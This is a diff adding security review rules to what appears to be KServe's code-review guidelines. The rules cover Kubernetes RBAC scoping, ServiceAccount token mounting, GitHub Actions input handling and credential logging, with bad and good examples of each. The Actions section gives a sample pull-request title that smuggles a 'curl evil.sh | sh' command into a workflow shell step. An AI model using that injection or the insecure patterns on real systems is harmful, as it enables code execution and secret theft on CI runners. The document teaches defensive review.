@@ -478,6 +478,136 @@ the same pod - the next caller may not be.
 **Why:** unencrypted traffic between pods is readable and modifiable by anything on the cluster network, and FIPS and
 restricted-cluster deployments reject plaintext service-to-service traffic outright.
 
+### Least-Privilege RBAC (SEC-080)
+
+**Trigger:** a diff adds an RBAC rule or a `//+kubebuilder:rbac` marker.
+
+```yaml
+# BAD: wildcard verbs on secrets, and escalate makes every other limit moot
+- apiGroups: [""]
+  resources: ["secrets"]
+  verbs: ["*"]
+- apiGroups: ["rbac.authorization.k8s.io"]
+  resources: ["clusterroles"]
+  verbs: ["escalate", "bind"]
+
+# GOOD: only what the reconciler calls, scoped where the set is known
+- apiGroups: [""]
+  resources: ["secrets"]
+  verbs: ["get", "list", "watch"]
+- apiGroups: [""]
+  resources: ["secrets"]
+  resourceNames: ["kserve-storage-config"]
+  verbs: ["update"]
+```
+
+**Applicability boundary:** access to `secrets`, `pods/exec`, `nodes/proxy` is often legitimate — KServe reads storage
+credentials by design. Require scoping, not removal. Cross-check the marker against what the reconciler actually calls;
+a grant wider than the code is the common drift. Do not propose narrowing a grant an existing watch depends on
+(BUG-050).
+
+**Why:** `escalate` and `bind` let the holder grant themselves any permission, so every other restriction in the role
+becomes decorative.
+
+### ServiceAccount Token Automount (SEC-090)
+
+**Trigger:** a diff adds a new workload or pod template.
+
+```yaml
+# BAD: new sidecar with no Kubernetes API calls still gets a mounted SA token
+spec:
+  template:
+    spec:
+      containers:
+        - name: tokenizer
+          image: kserve-tokenizer:latest
+
+# GOOD: matches config/llmisvcconfig/config-llm-tokenizer.yaml
+spec:
+  template:
+    spec:
+      serviceAccountName: kserve-tokenizer
+      automountServiceAccountToken: false
+      containers:
+        - name: tokenizer
+          image: kserve-tokenizer:latest
+```
+
+**Applicability boundary:** two hard exclusions. (1) The setting is inherited from the ServiceAccount, so a pod whose SA
+already sets `automountServiceAccountToken: false` is compliant — check both before filing. (2) This applies to *new*
+workloads. Adding it to an existing controller-managed pod template changes the pod template hash and forces a rollout
+on upgrade, which is a CTL-100 violation; for existing templates raise it as a note, not a required change.
+
+**Why:** a mounted token turns any container-level RCE into cluster API access with the SA's full permissions.
+
+### Untrusted Input in GitHub Actions (SEC-100)
+
+**Trigger:** a diff changes a file under `.github/workflows/`.
+
+```yaml
+# BAD: PR title is attacker-controlled and lands inside a shell command
+- run: echo "Reviewing ${{ github.event.pull_request.title }}"
+# a PR titled  "; curl evil.sh | sh; #  executes on the runner
+
+# BAD: pull_request_target checks out and runs untrusted PR code with a
+# privileged token and access to repository secrets
+on: pull_request_target
+steps:
+  - uses: actions/checkout@v4
+    with:
+      ref: ${{ github.event.pull_request.head.sha }}
+  - run: make test
+
+# GOOD: event data through env, quoted; this is the established kserve pattern
+# (see .github/workflows/pr-style-check.yml)
+env:
+  TITLE: ${{ github.event.pull_request.title }}
+run: |
+  echo "Reviewing $TITLE"
+
+# GOOD: SHA-pinned action, base ref, scoped permissions
+permissions:
+  pull-requests: write
+steps:
+  - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
+    with:
+      ref: master
+```
+
+**Applicability boundary:** `pull_request_target` alone is not a finding. KServe uses it correctly in
+`auto-assign-reviewers.yml` and `pr-style-check.yml` — SHA-pinned actions, `ref: master`, event data via `env:`, scoped
+permissions. Flag the unsafe combination (privileged trigger + PR-head checkout + execution), not the trigger.
+
+**Why:** a workflow that executes untrusted code with `pull_request_target`'s token can exfiltrate every secret in the
+repository, and injection into `run:` needs only a crafted PR title.
+
+### Secret Material in Logs and Errors (SEC-110)
+
+**Trigger:** a diff adds a log line, error wrap, Event, or condition message near credential handling.
+
+```go
+// BAD: the token value is now in the log aggregator forever
+log.Info("injecting credentials", "token", string(secret.Data["HF_TOKEN"]))
+return fmt.Errorf("auth failed with key %s: %w", apiKey, err)
+
+// BAD: logging the whole Secret embeds every value
+log.V(2).Info("loaded storage secret", "secret", secret)
+
+// GOOD: reference it, don't print it
+log.Info("injecting credentials", "secret", klog.KObj(secret), "key", "HF_TOKEN")
+return fmt.Errorf("auth failed using secret %s/%s: %w", secret.Namespace, secret.Name, err)
+
+// NOT A FINDING: a key *name*, not the credential
+log.Info("injecting storage spec credentials", "storageKey", *modelInfo.Storage.StorageKey)
+```
+
+**Applicability boundary:** this rule is easy to over-apply. Secret names, namespaces, key names, field selectors,
+ServiceAccount names, and object references are all safe to log — only the value itself is a finding. When it is
+genuinely unclear whether an identifier is a name or a value, resolve the type before filing.
+
+**Why:** logs are copied to aggregators, support bundles, and must-gathers. A credential written once is exposed
+everywhere those land, and rotation is the only remedy.
+
 ## Migration Safety
 
 ### Webhook Name Stability (MIG-020, NAM-020)
